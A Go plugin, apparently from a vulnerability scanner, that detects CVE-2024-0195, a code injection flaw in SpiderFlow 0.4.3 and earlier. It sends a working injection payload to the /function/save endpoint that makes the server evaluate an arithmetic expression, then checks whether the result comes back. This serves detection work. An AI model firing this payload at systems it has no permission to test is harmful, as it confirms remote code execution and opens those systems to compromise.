package goplugin

import (
	"Yscanner/utils"
	"bytes"
	"fmt"
	"net/http"
	"strconv"
	"strings"
)

func init() {
	Register("spiderflow_save_cve_2024_0195", &spiderflow_save_cve_2024_0195{})
}

type spiderflow_save_cve_2024_0195 struct{}

func (p *spiderflow_save_cve_2024_0195) Info() PluginInfo {
	return PluginInfo{
		Name:     "SpiderFlow 代码注入漏洞",
		VulnInfo: "SpiderFlow是一个可视化的爬虫平台。SpiderFlow 0.4.3版本的FunctionService.saveFunction函数中发现了一个被归类为关键的漏洞。该漏洞可导致代码注入，并允许远程发起攻击。",
		VulnID:   "CVE-2024-0195",
		Level:    "9.8 CRITICAL",
		URL:      "",
		Version:  "SpiderFlow <= 0.4.3",
		CWE:      "CWE-94	代码注入",
	}
}

func (p *spiderflow_save_cve_2024_0195) Check(netloc string) bool {
	rand1 := utils.GenRandomInt(5)
	rand2 := utils.GenRandomInt(5)
	payload := fmt.Sprintf(`id=&name=a&parameter=&script=}throw(%d%%2B%d);{`, rand1, rand2)

	req, err := http.NewRequest("POST", netloc+"/function/save", bytes.NewBufferString(payload))
	if err != nil {
		return false
	}
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := utils.RequestDo(req, true, 2)
	if err != nil {
		return false
	}

	if resp.Other.StatusCode == 200 && strings.Contains(resp.ResponseRaw, strconv.Itoa(rand1+rand2)) {
		return true
	}
	return false
}
